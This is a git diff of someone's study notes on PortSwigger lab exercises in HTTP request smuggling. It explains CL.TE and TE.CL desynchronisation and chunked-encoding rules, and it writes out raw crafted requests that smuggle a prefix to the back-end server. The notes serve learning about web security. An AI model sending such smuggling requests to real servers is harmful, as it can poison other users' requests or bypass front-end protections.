@@ -113,13 +113,18 @@ This happens because the frontend server processes the Content-Length header and
 The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following byte (`G`), is left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.
 That's why the second response responded: "Unrecognized method GPOST"
 
+### About `Transfer-Encoding: chunked` (from MDN): 
+Data is sent in a series of chunks. The Content-Length header is omitted in this case and at the beginning of each chunk you need to add the length of the current chunk in hexadecimal format, followed by '\r\n' and then the chunk itself, followed by another '\r\n'. The terminating chunk is a regular chunk, with the exception that its length is zero. It is followed by the trailer, which consists of a (possibly empty) sequence of header fields. 
+
 ### Lab: HTTP request smuggling, basic TE.CL vulnerability
+Please note:
+The valid ending of the req that is parsed by `Transfer-Encoding: chunked` must be: `0\r\n\r\n`
+Otherwise we're getting `Read timeout` err
+
 To test for TE.CL send the following req:
 ```
 POST / HTTP/1.1
 Host: ff.web-security-academy.net
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
 Content-Length: 6
 Transfer-Encoding: chunked
 \r\n
@@ -127,15 +132,13 @@ Transfer-Encoding: chunked
 abc\r\n
 X\r\n
 ```
-As a response we get: 400 Bad Request, {"error":"Invalid request"}
-It happens because the frontend server uses Transfer-Encoding header and therefore reads the first chunk (`abc` that has length of 3 bytes) and then it expects the size of the next chunk but instead it gets `X` which is invalid hex number and therefore it throw an err: 400 Bad request.
+As the response we get: 400 Bad Request, {"error":"Invalid request"}
+It happens because the frontend server uses Transfer-Encoding header and therefore reads the first chunk (`abc` that has length of 3 bytes) and then it expects the size of the next chunk but instead it gets `X\r\n` which is invalid hex number and therefore it throw an err: 400 Bad request.
 
 We can also check that backend server is using Content-Length header with the following req:
 ```
 POST / HTTP/1.1
 Host: ff.web-security-academy.net
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
 Content-Length: 6
 Transfer-Encoding: chunked
 \r\n
@@ -144,9 +147,25 @@ Transfer-Encoding: chunked
 X
 ```
 The response will be: 500 Internal Server Error, Communication timed out 
-Because the frontend server parsed `0` as chunk size and therefore truncated everything after it.
-And when the backend server received Content-Length of 6 but the actual length of the body was 5 (`0\r\n\r\n`) - So the backend server will wait for the sixth byte to arrive until it times out and throws an err 
+Because the frontend server parsed `0` as chunk size and therefore truncated everything after it (in this case `X` was truncated).
+And when the backend server received Content-Length of 6 but the actual length of the body was 5 (`0\r\n\r\n` without `X`) - So the backend server will wait for the sixth byte to arrive until it times out and throws an err 
 
+To solve the lab we need to smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`
 
+So we try:
+```bash
+POST / HTTP/1.1
+Host: 0a0f00a60482050c804058ca009c00e8.web-security-academy.net
+Content-Length: 3
+Transfer-Encoding: chunked
+\r\n
+1\r\n
+G\r\n
+0\r\n
+\r\n
+```
+First response is 200 and the second response: "Unrecognized method G0POST"
 
+We can't just remove `0` from the end because `0\r\n\r\n` is the valid ending of `Transfer-Encoding: chunked` 
+If we remove it we'll get a `Read timeout` because the frontend server still expects the valid ending of the body (which is `0\r\n\r\n`)
 
